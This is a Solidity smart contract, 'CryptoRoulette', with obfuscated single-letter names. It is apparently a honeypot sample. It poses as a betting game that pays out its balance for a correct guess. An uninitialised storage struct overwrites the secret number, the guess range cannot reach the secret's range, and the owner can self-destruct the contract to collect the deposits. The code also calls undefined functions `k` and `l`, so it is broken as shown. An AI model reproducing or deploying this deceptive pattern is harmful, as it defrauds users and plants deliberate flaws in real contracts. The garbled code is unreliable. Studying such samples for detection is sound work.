pragma solidity ^0.4.19;


contract CryptoRoulette {

    uint256 private a;
    uint256 public c;
    uint256 public e = 0.1 ether;
    address public d;

    struct Game {
        address g;
        uint256 number;
    }
    Game[] public b;

    function CryptoRoulette() public {
        d = msg.sender;
        f();
    }

    function f() internal {

        a = uint8(k(l, block.blockhash(block.number-1))) % 20 + 1;
    }

    function j(uint256 number) payable public {
        require(msg.value >= e && number <= 10);
        Game h;
        h.g = msg.sender;
        h.number = number;
        b.push(h);

        if (number == a) {

            msg.sender.transfer(this.balance);
        }

        f();
        c = l;
    }

    function i() public {
        if (msg.sender == d && l > c + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}